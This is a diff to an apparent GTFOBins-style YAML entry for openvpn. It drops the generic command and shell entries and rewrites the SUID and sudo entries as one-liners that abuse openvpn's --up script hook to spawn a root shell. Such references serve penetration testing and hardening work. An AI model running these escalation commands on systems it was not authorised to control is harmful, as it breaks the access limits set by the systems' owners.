@@ -1,18 +1,10 @@
 ---
 functions:
-  command:
-    - code: |
-        COMMAND='id'
-        openvpn --dev tun0 --script-security 2 --up "/usr/bin/sh -c \"$COMMAND\""
-  shell:
-    - code: |
-        openvpn --dev tun0 --script-security 2 --up "/usr/bin/sh -c sh"
   suid:
     - code: |
-        COMMAND='id'
-        openvpn --dev tun0 --script-security 2 --up "/usr/bin/sh -p -c \"$COMMAND\""
+        ./openvpn --dev tun0 --script-security 2 --up '/bin/sh -p -c "sh -p"'
   sudo:
     - code: |
         COMMAND='id'
-        sudo openvpn --dev tun0 --script-security 2 --up "/usr/bin/sh -c \"$COMMAND\""
+        sudo openvpn --dev tun0 --script-security 2 --up '/bin/sh -c sh'
 ---
